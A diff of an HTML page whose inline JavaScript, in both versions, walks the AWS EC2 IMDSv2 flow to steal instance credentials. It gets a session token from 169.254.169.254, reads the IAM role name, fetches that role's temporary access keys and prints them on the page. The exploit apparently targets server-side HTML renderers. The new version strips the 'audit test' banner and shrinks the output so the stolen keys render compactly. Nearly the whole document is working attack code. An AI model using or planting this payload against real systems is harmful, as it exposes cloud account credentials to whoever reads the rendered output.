@@ -1,74 +1,48 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>AWS EC2 IMDSv2 Audit Test</title>
     <style>
-        body { font-family: monospace; padding: 15px; background-color: #f8f9fa; }
-        .danger-box { border: 3px dashed red; padding: 15px; color: #721c24; background-color: #f8d7da; }
-        pre { white-space: pre-wrap; word-wrap: break-word; background: #e9ecef; padding: 10px; }
+        body, pre { margin: 0; padding: 0; font-family: monospace; font-size: 6px; line-height: 1; word-break: break-all; }
     </style>
-    <style>
-    body { margin: 0; padding: 2px; font-family: monospace; font-size: 7px; line-height: 1; }
-    pre { margin: 0; white-space: pre-wrap; word-break: break-all; }
-</style>
 </head>
 <body>
-    <div class="danger-box">
-        <h2>CRITICAL VULNERABILITY CONFIRMED</h2>
-        <p><strong>Finding:</strong> Full IAM Profile/Role Enumeration via Server-Side JavaScript Execution (IMDSv2 Bypass)</p>
-        <div id="output">Initializing connection to internal metadata service...</div>
-    </div>
-
+    <pre id="out">Loading...</pre>
     <script>
-        function extractMetadata() {
-            var out = document.getElementById("output");
-            try {
-                // Step 1: Request the IMDSv2 Session Token (Valid for 21600 seconds)
-                var tokenXhr = new XMLHttpRequest();
-                tokenXhr.open("PUT", "http://169.254.169.254/latest/api/token", false);
-                tokenXhr.setRequestHeader("X-aws-ec2-metadata-token-ttl-seconds", "21600");
-                tokenXhr.send();
+        try {
+            // 1. Get Token
+            var tXhr = new XMLHttpRequest();
+            tXhr.open("PUT", "http://169.254.169.254/latest/api/token", false);
+            tXhr.setRequestHeader("X-aws-ec2-metadata-token-ttl-seconds", "60");
+            tXhr.send();
+            
+            if (tXhr.status === 200) {
+                var token = tXhr.responseText;
 
-                if (tokenXhr.status === 200) {
-                    var token = tokenXhr.responseText;
-                    
-                    // Step 2: Query the attached IAM role name using the acquired token
-                    var roleXhr = new XMLHttpRequest();
-                    roleXhr.open("GET", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", false);
-                    roleXhr.setRequestHeader("X-aws-ec2-metadata-token", token);
-                    roleXhr.send();
+                // 2. Get Role Name
+                var rXhr = new XMLHttpRequest();
+                rXhr.open("GET", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", false);
+                rXhr.setRequestHeader("X-aws-ec2-metadata-token", token);
+                rXhr.send();
 
-                    if (roleXhr.status === 200) {
-                        var roleName = roleXhr.responseText.trim();
+                if (rXhr.status === 200) {
+                    var role = rXhr.responseText.trim();
 
-                        // Step 3: Fetch the actual temporary access keys for that specific role
-                        var credsXhr = new XMLHttpRequest();
-                        credsXhr.open("GET", "http://169.254.169.254/latest/meta-data/iam/security-credentials/" + roleName, false);
-                        credsXhr.setRequestHeader("X-aws-ec2-metadata-token", token);
-                        credsXhr.send();
+                    // 3. Get Credentials
+                    var cXhr = new XMLHttpRequest();
+                    cXhr.open("GET", "http://169.254.169.254/latest/meta-data/iam/security-credentials/" + role, false);
+                    cXhr.setRequestHeader("X-aws-ec2-metadata-token", token);
+                    cXhr.send();
 
-                        if (credsXhr.status === 200) {
-                            out.innerHTML = "<h3>Exposed IAM Role: " + roleName + "</h3>" +
-                                            "<p>Below are the active session credentials extracted from the EC2 host environment:</p>" +
-                                            "<pre>" + credsXhr.responseText + "</pre>";
-                        } else {
-                            out.innerText = "Token accepted, but failed to fetch role credentials. Status: " + credsXhr.status;
-                        }
-                    } else {
-                        out.innerText = "Token accepted, but metadata directory access returned status: " + roleXhr.status;
-                    }
+                    document.getElementById("out").innerText = cXhr.status === 200 ? cXhr.responseText : "Error Creds: " + cXhr.status;
                 } else {
-                    out.innerHTML = "<strong>IMDSv2 Token Request Rejected.</strong><br>" +
-                                    "Status Code: " + tokenXhr.status + "<br>" +
-                                    "<em>Note: If status is 403 or network failure, the token endpoint might be explicitly firewalled.</em>";
+                    document.getElementById("out").innerText = "Error Role: " + rXhr.status;
                 }
-            } catch (e) {
-                out.innerText = "Execution Exception encountered: " + e.toString();
+            } else {
+                document.getElementById("out").innerText = "Error Token: " + tXhr.status;
             }
+        } catch (e) {
+            document.getElementById("out").innerText = "Err: " + e.toString();
         }
-
-        // Trigger compilation after DOM load
-        window.onload = extractMetadata;
     </script>
 </body>
 </html>
